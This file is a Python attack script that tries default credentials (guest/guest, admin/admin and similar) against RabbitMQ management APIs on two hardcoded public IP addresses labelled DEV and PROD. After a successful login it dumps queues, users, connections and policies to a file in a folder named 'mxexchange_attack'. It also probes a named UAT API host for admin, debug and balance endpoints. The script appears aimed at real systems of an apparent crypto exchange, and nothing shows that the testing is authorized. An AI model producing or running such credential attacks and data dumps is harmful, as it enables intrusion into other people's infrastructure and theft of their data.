import requests, json, sys, time

targets = [
    ("13.76.221.253", 15672, "RabbitMQ DEV"),
    ("52.187.114.84", 15672, "RabbitMQ PROD (mgmt?)"),
]

creds = [
    ("guest","guest"), ("admin","admin"), ("rabbitmq","rabbitmq"),
    ("admin","password"), ("mx","mx"), ("mxglobal","mxglobal"),
    ("admin","123456"), ("admin","admin123"),
]

for host, port, label in targets:
    base = f"http://{host}:{port}"
    print(f"\n{'='*60}")
    print(f"TARGET: {label} ({host}:{port})")
    print(f"{'='*60}")

    try:
        r = requests.get(f"{base}/", timeout=8)
        print(f"  GET / => {r.status_code} ({len(r.text)} bytes)")
        if "rabbitmq" in r.text.lower():
            print("  [+] RabbitMQ Management UI CONFIRMED!")
    except requests.exceptions.ConnectTimeout:
        print(f"  GET / => TIMEOUT (port filtered)")
        continue
    except Exception as e:
        print(f"  GET / => ERROR: {e}")
        continue

    for user, pwd in creds:
        try:
            r = requests.get(f"{base}/api/overview", auth=(user, pwd), timeout=8)
            status = r.status_code
            if status == 200:
                data = r.json()
                ver = data.get("rabbitmq_version", "?")
                node = data.get("node", "?")
                print(f"  {user}:{pwd} => {status} [!!!] ACCESS - v{ver} node={node}")

                # Dump queues
                r2 = requests.get(f"{base}/api/queues", auth=(user, pwd), timeout=8)
                if r2.status_code == 200:
                    queues = r2.json()
                    print(f"  [+] QUEUES ({len(queues)}):")
                    for q in queues[:30]:
                        name = q.get("name","?")
                        msgs = q.get("messages", 0)
                        cons = q.get("consumers", 0)
                        print(f"      {name} (msgs={msgs}, consumers={cons})")

                # Dump exchanges
                r3 = requests.get(f"{base}/api/exchanges", auth=(user, pwd), timeout=8)
                if r3.status_code == 200:
                    exs = r3.json()
                    print(f"  [+] EXCHANGES ({len(exs)}):")
                    for ex in exs[:20]:
                        print(f"      {ex.get('name','(default)')} type={ex.get('type','?')}")

                # Dump users
                r4 = requests.get(f"{base}/api/users", auth=(user, pwd), timeout=8)
                if r4.status_code == 200:
                    users = r4.json()
                    print(f"  [+] USERS ({len(users)}):")
                    for u in users:
                        print(f"      {u.get('name','?')} tags={u.get('tags','?')}")

                # Dump connections
                r5 = requests.get(f"{base}/api/connections", auth=(user, pwd), timeout=8)
                if r5.status_code == 200:
                    conns = r5.json()
                    print(f"  [+] CONNECTIONS ({len(conns)}):")
                    for c in conns[:10]:
                        print(f"      {c.get('user','?')}@{c.get('peer_host','?')}:{c.get('peer_port','?')}")

                # Save full dump
                dump = {"overview": data}
                for endpoint, key in [("queues","queues"),("exchanges","exchanges"),("users","users"),("connections","connections"),("vhosts","vhosts"),("bindings","bindings"),("policies","policies")]:
                    try:
                        rd = requests.get(f"{base}/api/{endpoint}", auth=(user, pwd), timeout=8)
                        if rd.status_code == 200:
                            dump[key] = rd.json()
                    except:
                        pass
                
                fname = f"c:\\xampp\\htdocs\\pentagi\\mxexchange_attack\\rabbitmq_{label.replace(' ','_').lower()}_dump.json"
                with open(fname, "w") as f:
                    json.dump(dump, f, indent=2)
                print(f"  [+] Full dump saved to {fname}")
                break
            elif status == 401:
                print(f"  {user}:{pwd} => 401 Unauthorized")
            else:
                print(f"  {user}:{pwd} => {status}")
        except requests.exceptions.ConnectTimeout:
            print(f"  {user}:{pwd} => TIMEOUT")
            break
        except Exception as e:
            print(f"  {user}:{pwd} => ERROR: {e}")
            break

# Also probe UAT for hidden endpoints
print(f"\n{'='*60}")
print("UAT API PROBE (openapiuat.azurewebsites.net)")
print(f"{'='*60}")
uat = "https://openapiuat.azurewebsites.net"
paths = [
    "/api/health", "/health", "/api/status", "/api/version",
    "/api/1/user/order/fak_order", "/api/1/user/balance",
    "/api/admin", "/api/internal", "/api/debug",
    "/api/swagger.json", "/api/v2", "/api/v3",
    "/.well-known/openid-configuration",
    "/api/1/user/order/openorders?pair=BTCMYR&limit=1000",
]
for p in paths:
    try:
        r = requests.get(f"{uat}{p}", timeout=8, verify=False)
        if r.status_code not in [404]:
            print(f"  {p} => {r.status_code} ({len(r.text)} bytes)")
    except:
        pass

print("\nDONE")
